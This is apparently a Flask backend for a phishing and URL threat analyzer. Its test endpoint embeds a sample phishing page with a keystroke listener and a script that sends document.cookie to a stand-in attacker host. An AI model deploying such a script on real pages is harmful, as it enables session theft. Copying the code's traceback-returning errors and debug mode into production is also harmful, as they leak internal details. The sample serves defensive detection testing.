from flask import Flask, request, jsonify
from flask_cors import CORS
import numpy as np
from models.url_analyzer import URLAnalyzer
from models.visual_analyzer import VisualAnalyzer
from models.behavior_analyzer import BehaviorAnalyzer
from utils.feature_extractor import FeatureExtractor
from utils.ssl_validator import SSLValidator
from models.ai_modules.phishing_analyzer import PhishingAnalyzer
from asgiref.wsgi import WsgiToAsgi
import uvicorn
import os
from dotenv import load_dotenv
import google.generativeai as genai
import re
import logging
from urllib.parse import urlparse
import base64
import time
import hashlib
import cv2
import io
from PIL import Image
import traceback
from routes.threat_intelligence import threat_intelligence_bp
from models.ai_modules.threat_intelligence import ThreatIntelligence
from models.ai_modules.security_orchestrator import SecurityOrchestrator

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)

logger = logging.getLogger(__name__)

# Set port for the server
PORT = 9000

# Configure Gemini
USE_AI = True
try:
    load_dotenv()
    GEMINI_API_KEY = os.getenv("GEMINI_API_KEY")
    
    if GEMINI_API_KEY:  # Re-enable AI functionality
        # Test Gemini connection
        try:
            # Add your Gemini test code here
            USE_AI = True
            logger.info("Gemini model initialized successfully")
        except Exception as e:
            logger.error(f"Gemini model test failed: {e}")
            USE_AI = False
    else:
        logger.warning("No Gemini API key found, falling back to basic analysis")
        USE_AI = False
except Exception as e:
    logger.error(f"Error setting up Gemini: {e}")
    USE_AI = False

app = Flask(__name__)
CORS(app)   
asgi_app = WsgiToAsgi(app)

# Register blueprints
app.register_blueprint(threat_intelligence_bp, url_prefix='/api/threat-intelligence')

class SecureNetAPI:
    def __init__(self):
        """Initialize the Secure Net API with enhanced security orchestration"""
        self.orchestrator = SecurityOrchestrator()
        logger.info("SecureNetAPI initialized with enhanced security orchestration")
        
    async def analyze_url(self, url, content, behavior_data):
        """Analyze URL using comprehensive security orchestration"""
        try:
            # Extract visual data from content if available
            visual_data = self._extract_visual_data(content)
            
            # Perform comprehensive analysis
            results = await self.orchestrator.comprehensive_analysis(
                url=url,
                content=content,
                visual_data=visual_data,
                behavior_data=behavior_data
            )
            
            return {
                'status': 'success',
                'risk_assessment': {
                    'risk_score': results['risk_score'],
                    'confidence': results['confidence'],
                    'risk_level': results['risk_level']
                },
                'component_scores': results['component_scores'],
                'analysis_details': {
                    'multimodal_analysis': results['analysis_results']['multimodal'],
                    'phishing_detection': results['analysis_results']['phishing'],
                    'age_verification': results['analysis_results']['age_verification'],
                    'zero_day_detection': results['analysis_results']['zero_day'],
                    'threat_intelligence': results['analysis_results']['threat_intelligence']
                }
            }
            
        except Exception as e:
            logger.error(f"Error analyzing URL: {str(e)}")
            return {
                'status': 'error',
                'message': str(e),
                'traceback': traceback.format_exc()
            }
            
    async def analyze_image(self, image_data):
        """Analyze image using security orchestration"""
        try:
            # Create minimal context for image-only analysis
            results = await self.orchestrator.comprehensive_analysis(
                url="",
                content="",
                visual_data=image_data,
                behavior_data={}
            )
            
            return {
                'status': 'success',
                'risk_assessment': {
                    'risk_score': results['risk_score'],
                    'confidence': results['confidence'],
                    'risk_level': results['risk_level']
                },
                'visual_analysis': results['analysis_results']['multimodal'],
                'age_verification': results['analysis_results']['age_verification']
            }
            
        except Exception as e:
            logger.error(f"Error analyzing image: {str(e)}")
            return {
                'status': 'error',
                'message': str(e),
                'traceback': traceback.format_exc()
            }
            
    def _extract_visual_data(self, content):
        """Extract visual data from content if available"""
        try:
            # Check if content contains any base64 encoded image data
            if content and isinstance(content, str):
                # Look for base64 image patterns
                import re
                import base64
                from io import BytesIO
                
                # Find base64 encoded images in the content
                image_pattern = r'data:image/(?P<format>[a-zA-Z]+);base64,(?P<data>[a-zA-Z0-9+/=]+)'
                matches = re.findall(image_pattern, content)
                
                if matches:
                    # Use the first image found
                    img_format, b64_data = matches[0]
                    
                    # Decode the base64 data
                    img_data = base64.b64decode(b64_data)
                    
                    # Create and return a PIL Image
                    return Image.open(BytesIO(img_data))
                
                # If no embedded images, create a screenshot of rendered content (simplified simulation)
                if "<!DOCTYPE html>" in content or "<html" in content:
                    # Simplified: create a colored image representing the page
                    # In a real implementation, this would use a headless browser
                    width, height = 300, 200
                    
                    # Hash the content to generate consistent colors for the same content
                    import hashlib
                    hash_obj = hashlib.md5(content.encode())
                    hash_val = int(hash_obj.hexdigest(), 16)
                    
                    r = (hash_val & 0xFF0000) >> 16
                    g = (hash_val & 0x00FF00) >> 8
                    b = hash_val & 0x0000FF
                    
                    # Create a colored image based on the content hash
                    return Image.new('RGB', (width, height), color=(r, g, b))
                    
            # Default: return a standard test pattern image for analysis
            return self._create_test_pattern_image()
        except Exception as e:
            logger.error(f"Error extracting visual data: {str(e)}")
            return self._create_test_pattern_image()
    
    def _create_test_pattern_image(self):
        """Create a test pattern image that's better for analysis than a blank image"""
        width, height = 224, 224
        image = Image.new('RGB', (width, height), color='white')
        
        # Draw a simple test pattern
        from PIL import ImageDraw
        draw = ImageDraw.Draw(image)
        
        # Draw a border
        draw.rectangle([(0, 0), (width-1, height-1)], outline='black')
        
        # Draw crossing lines
        draw.line([(0, 0), (width, height)], fill='red', width=2)
        draw.line([(width, 0), (0, height)], fill='blue', width=2)
        
        # Draw a central circle
        center_x, center_y = width // 2, height // 2
        radius = min(width, height) // 4
        draw.ellipse((center_x - radius, center_y - radius, 
                      center_x + radius, center_y + radius), 
                     outline='green', width=2)
        
        return image

# Initialize API
api = SecureNetAPI()

@app.route('/api/analyze', methods=['POST'])
def analyze():
    """Endpoint for comprehensive security analysis"""
    try:
        data = request.get_json()
        url = data.get('url', '')
        content = data.get('content', '')
        behavior_data = data.get('behavior', {})
        
        # Run async function with asyncio
        import asyncio
        result = asyncio.run(api.analyze_url(url, content, behavior_data))
        return jsonify(result)
        
    except Exception as e:
        logger.error(f"Error in analyze endpoint: {str(e)}")
        return jsonify({
            "status": "error",
            "message": str(e),
            "traceback": traceback.format_exc()
        }), 500

@app.route('/api/analyze-image', methods=['POST'])
def analyze_image():
    """Endpoint for image analysis"""
    try:
        image_file = request.files['image']
        image = Image.open(image_file)
        
        # Run async function with asyncio
        import asyncio
        result = asyncio.run(api.analyze_image(image))
        return jsonify(result)
        
    except Exception as e:
        logger.error(f"Error in analyze_image endpoint: {str(e)}")
        return jsonify({
            "status": "error",
            "message": str(e),
            "traceback": traceback.format_exc()
        }), 500

@app.route('/api/status', methods=['GET'])
def status():
    """Health check endpoint"""
    return jsonify({"status": "ok"})

@app.route('/api/test-analysis', methods=['GET'])
def test_analysis():
    """Test endpoint to verify real analysis values"""
    try:
        # Create a test URL and content that should trigger analysis
        test_url = "http://test-phishing-site.example.com/login.php"
        test_content = """
        <!DOCTYPE html>
        <html>
        <head>
            <title>Login - Secure Bank</title>
        </head>
        <body>
            <div class="login-form">
                <h2>Enter your credentials</h2>
                <form method="POST" action="/submit.php">
                    <input type="text" name="username" placeholder="Username">
                    <input type="password" name="password" placeholder="Password">
                    <input type="hidden" name="redirect" value="http://evil-site.example.com">
                    <button type="submit">Login</button>
                </form>
            </div>
            <script>
                // Suspicious script that would be analyzed
                document.addEventListener("keyup", function(e) {
                    console.log("Key pressed: " + e.key);
                });
                
                // Attempt to redirect
                setTimeout(function() {
                    window.location = "http://data-stealing-site.example.com/?data=" + document.cookie;
                }, 10000);
            </script>
        </body>
        </html>
        """
        
        # Simulate behavior data
        test_behavior = {
            "forms": 1,
            "hasPasswordField": True,
            "hasLoginForm": True,
            "redirectCount": 2,
            "scripts": [
                "document.addEventListener(\"keyup\", function(e) { console.log(\"Key pressed: \" + e.key); });",
                "setTimeout(function() { window.location = \"http://data-stealing-site.example.com/?data=\" + document.cookie; }, 10000);"
            ],
            "iframes": 0,
            "hiddenElements": 1,
            "links": 2,
            "externalLinks": ["http://evil-site.example.com", "http://data-stealing-site.example.com"],
            "eventListeners": {
                "keyup": ["document"],
                "keydown": [],
                "input": []
            }
        }
        
        # Run analysis
        import asyncio
        result = asyncio.run(api.analyze_url(test_url, test_content, test_behavior))
        
        # Add debug info
        result['debug_info'] = {
            'backend_version': '1.0.0',
            'ai_enabled': USE_AI,
            'test_url': test_url[:30] + '...' if len(test_url) > 30 else test_url
        }
        
        return jsonify(result)
        
    except Exception as e:
        logger.error(f"Error in test analysis endpoint: {str(e)}")
        return jsonify({
            "status": "error",
            "message": str(e),
            "traceback": traceback.format_exc()
        }), 500

if __name__ == '__main__':
    try:
        logger.info(f"Starting Kavach Security backend server on port {PORT}")
        logger.info(f"API will be available at http://127.0.0.1:{PORT}/api")
        logger.info(f"Health check endpoint: http://127.0.0.1:{PORT}/api/status")
        
        # Use Werkzeug's development server for better debugging
        # This ensures Flask routes work properly with async functions
        app.run(host="127.0.0.1", port=PORT, debug=True)
    except Exception as e:
        logger.error(f"Failed to start server: {str(e)}")
        logger.error(f"Error details: {traceback.format_exc()}")
        print(f"Server startup failed: {str(e)}") 